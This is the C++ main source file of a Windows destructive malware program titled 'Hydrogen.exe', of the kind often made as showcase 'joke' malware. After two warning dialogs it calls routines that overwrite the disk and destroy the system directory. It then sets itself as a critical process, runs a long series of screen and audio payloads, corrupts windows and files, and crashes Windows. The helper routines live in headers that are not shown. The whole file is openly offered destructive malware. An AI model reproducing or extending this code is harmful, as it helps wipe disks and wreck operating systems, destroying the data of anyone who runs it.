#include "destruction.h"
#include "payloads.h"

void InitDPI() {
	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}

	FreeLibrary(hModUser32);
}

int WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd
) {
	int msgResult = MessageBox(NULL, L"What you have just executed is a malware.\nYou might lose all of your data if you continue!\nStill execute it?", L"Hydrogen.exe", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
	if (msgResult != IDYES) {
		ExitProcess(0);
	}
	msgResult = MessageBox(NULL, L"THIS IS THE LAST WARNING!\nTHE CREATOR OF THIS MALWARE WILL NOT BE RESPONSIBLE FOR ANY DESTRUCTION CAUSED BY THIS MALWARE!\nSTILL CONTINUE?", L"Hydrogen.exe - LAST WARNING", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
	if (msgResult != IDYES) {
		ExitProcess(0);
	}

	WCHAR SystemDirectory[MAX_PATH] = { 0 };
	GetSystemDirectory(SystemDirectory, MAX_PATH);

	OverWriteDisk();
	DestroyDirectory(SystemDirectory);

	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
	pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2 };
	pAudioSequences[2] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence3 };
	pAudioSequences[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4 };
	pAudioSequences[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence5 };
	pAudioSequences[5] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence6 };
	pAudioSequences[6] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence7 };
	pAudioSequences[7] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence8 };
	pAudioSequences[8] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence9 };
	pAudioSequences[9] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence10 };

	SeedXorshift32((DWORD)__rdtsc());

	InitDPI();

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);

	SetCriticalProcess();

	ExecutePayload(Payload1, PAYLOAD_TIME);
	ExecutePayload(Payload2, PAYLOAD_TIME);
	ExecutePayload(Payload3, PAYLOAD_TIME);
	ExecutePayload(Payload4, PAYLOAD_TIME);
	ExecutePayload(Payload5, PAYLOAD_TIME);
	ExecutePayload(Payload6, PAYLOAD_TIME);
	ExecutePayload(Payload7, PAYLOAD_TIME);
	ExecutePayload(Payload8, PAYLOAD_TIME);
	ExecutePayload(Payload9, PAYLOAD_TIME);
	ExecutePayload(Payload10, PAYLOAD_TIME);

	ExecuteShader(Shader1, PAYLOAD_TIME);
	ExecuteShader(Shader2, PAYLOAD_TIME);
	ExecuteShader(Shader3, PAYLOAD_TIME);
	ExecuteShader(Shader4, PAYLOAD_TIME);
	ExecuteShader(Shader5, PAYLOAD_TIME);
	ExecuteShader(Shader6, PAYLOAD_TIME);
	ExecuteShader(Shader7, PAYLOAD_TIME);
	ExecuteShader(Shader8, PAYLOAD_TIME);
	ExecuteShader(Shader9, PAYLOAD_TIME);
	ExecuteShader(Shader10, PAYLOAD_TIME);
	ExecuteShader(Shader11, PAYLOAD_TIME);
	ExecuteShader(Shader12, PAYLOAD_TIME);
	ExecuteShader(Shader13, PAYLOAD_TIME);
	ExecuteShader(Shader14, PAYLOAD_TIME);
	ExecuteShader(Shader15, PAYLOAD_TIME);
	ExecuteShader(Shader16, PAYLOAD_TIME);

	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(FileMessPayload), (PVOID)SystemDirectory, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
	Sleep(20000);
	CrashWindows();
	return 0;
}